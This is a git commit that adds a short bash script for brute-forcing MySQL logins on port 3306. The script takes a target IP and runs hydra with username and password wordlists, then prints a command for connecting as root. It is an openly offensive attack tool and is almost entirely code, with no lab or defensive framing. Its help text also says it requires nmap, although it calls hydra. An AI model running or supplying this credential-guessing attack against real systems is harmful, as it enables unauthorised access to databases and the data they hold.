23bd8bfc40652c4adf0807b933f99f3a1a0cc0f8
hackingyseguridad <antonio_taboada@hotmail.es>
2025-09-22 16:43:54 +0200

    Create brutemysql2.sh

---
+++ brutemysql2.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+cat << "INFO"
+
+MySQL -
+
+INFO
+if [ -z "$1" ]; then
+        echo
+        echo "Fuerza bruta con diccionarios a MySQL en 3306/TCP."
+        echo "Requiere nmap"
+        echo "Uso.: sh brutemysql2.sh <ip>"
+        echo
+        exit 0
+fi
+echo
+echo
+
+hydra -L usuarios0.txt -P claves0.txt $1 mysql
+
+echo
+echo "mysql -h $1 -u root -p "
+echo
+
